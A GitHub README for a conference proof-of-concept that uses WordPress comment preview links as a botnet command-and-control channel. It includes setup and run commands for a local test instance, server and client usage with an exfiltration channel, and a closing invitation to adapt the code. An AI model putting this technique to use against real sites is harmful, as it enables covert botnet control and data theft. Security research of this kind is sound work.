# wp-c2 (WordPress-C2)
This repo contains a working proof of concept (PoC) code that shows the use of the comments section of Wordpress blogs as a command and control server. This works even if the blog has comment auto-moderation turned on.

This approach was presented in my talk at Rootcon 15 titled "Using Wordpress Comments Section as a C&C for Fun".

## How it works
In this approach, the botmaster (attacker) and bots (infected machines) use the comments section of a target blog as a communications channel. This is done by understanding and exploiting how Wordpress creates a preview link when a comment is posted.

When the botmaster wants to send a message, it posts a comment which autonatically gets added to the moderation queue. A preview URL with an expiry of 10 minutes is also automatically generated by Wordpress. Visiting this preview URL will show the submitted comment. 

In order for the bots to view the comment posted by the botmaster, they will generate the same preview link by exploting how the preview URL generation works. Using a number of steps explained in my talk, the bots will be able to generate the same exact link that the botmaster received, allowing them to view the submitted comment.

Communications from bots to botmaster is done the same way.

# Requirements
  * [docker-compose](https://docs.docker.com/compose/install/)

# How to test
This repository automatically sets up a local Wordpress instance using Docker. With some configuration, both the botmaster and bots can be able tonuse this local wordpress instance to send messages to each other.

First, download the repository and then run the script thst would the Docker container with the Wordpress instance.

```console
$ git clone git@github.com:accidentalrebel/wp-c2.git
$ cd wp-c2/src
$ ../tools/docker.sh
```

Once the docker setup is done, visit `http://127.0.0.3` using a web browser and follow the Wordpress installation guide. When this is done, you now have a local installation of Wordpress.

> Take note that the Wordpress installation included in this repository has been modified to allow the commenting of multiple clients from the same machine. This is only needed when testing this PoC.

Create two new blog posts, one will be used for sending messages, and the other is for acknowledging messages. It doesn't matter what the content is, what matters is their URLs. 

Get the permalinks of these two blog posts. For example, if the URL of "Blog Post 1" is `http://127.0.0.3/2021/09/29/blog-post-1/` then it's permalink is `2021/09/29/blog-post-1/`. Take note of the permalinks for both the blog posts as we'll be using it in a bit.

Run the server using the command below:

```console
$ python server.py -t "http://127.0.0.3/" -x "2021/09/29/blog-post-1/" -a "2021/09/29/blog-post-2/" 1
```

Then on separate terminals, you can run multiple clients like so:

```console
$ python client.py -t "http://127.0.0.3/" -x "2021/09/29/blog-post-1/" -a "2021/09/29/blog-post-2/" 2
$ python client.py -t "http://127.0.0.3/" -x "2021/09/29/blog-post-1/" -a "2021/09/29/blog-post-2/" 2
$ python client.py -t "http://127.0.0.3/" -x "2021/09/29/blog-post-1/" -a "2021/09/29/blog-post-2/" 2
```

For more info about the arguments, you can do `python server.py --help`.

```console
usage: server.py [-h] -t TARGET -x EXFIL_CHANNEL -a ACK_CHANNEL [-v] id_number

Starts the server.

positional arguments:
  id_number             ID number of this server. Should be unique from clients.

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        URL of target blog.
  -x EXFIL_CHANNEL, --exfil_channel EXFIL_CHANNEL
                        Permalink of the exfil channel. Format: 2021/08/13/exfil-channel-post/.
  -a ACK_CHANNEL, --ack_channel ACK_CHANNEL
                        Permalink of the acknowledgement channel. Format: 2021/08/13/ack-channel-post/.
  -v, --verbose         Enable verbose logging.
```

Go back to the terminal where you started the server. The server is now waiting for a command. At the moment, the only command available is "info". If this is entered, then the server will send an "info" command to all listening clients. The clients would then get information on their infected computers and send it back to the server (For this PoC, instead of getting the computer information it would just generate a random string with 10 characters).

All information sent by the bots back to the server will be saved in `output/exfiltrated.txt`.

# Where to go from here

If this approach catches your interest then feel free to take this code and improve it for your needs. The features of this PoC is limited, but it has everything that you need to use Wordpress as a C2 server.
